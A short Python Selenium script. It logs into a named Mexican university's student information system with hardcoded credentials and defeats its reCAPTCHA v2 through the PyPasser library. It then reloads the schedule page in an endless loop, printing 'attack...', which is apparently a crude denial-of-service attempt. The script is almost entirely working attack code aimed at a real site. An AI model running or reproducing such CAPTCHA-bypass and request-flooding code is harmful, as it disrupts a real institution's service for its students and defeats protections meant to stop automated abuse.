from pypasser import reCaptchaV2

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.edge.service import Service
from webdriver_manager.chrome import ChromeDriverManager

control_number = 20140936
nip = 8194
import time
# Create an instace of webdriver
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))

# Open target
driver.get('https://sii.itq.edu.mx/sistema/')
time.sleep(2)
# using find_element method
search_field = driver.find_element(By.ID, 'usr')
search_field.send_keys(control_number)
search_field = driver.find_element(By.ID, 'pwd')
search_field.send_keys(nip)
# Solve reCaptcha v2 via PyPasser
is_checked = reCaptchaV2(driver=driver, play=False)

if is_checked:
    # Click submit button
    #driver.find_element(By.CSS_SELECTOR, '#recaptcha-demo-submit').click()
    #if 'Verification Success' in driver.page_source:
        #print('SUCCESS')   
    #click enter button
    login_button = driver.find_element(By.XPATH, '//button[@class="btn btn-default" and @type="submit"]').click()
    while True:
        print("attack...")
        driver.get("https://sii.itq.edu.mx/sistema/modulos/cons/alumnos/horario.php")    
else:
    print('FAIL')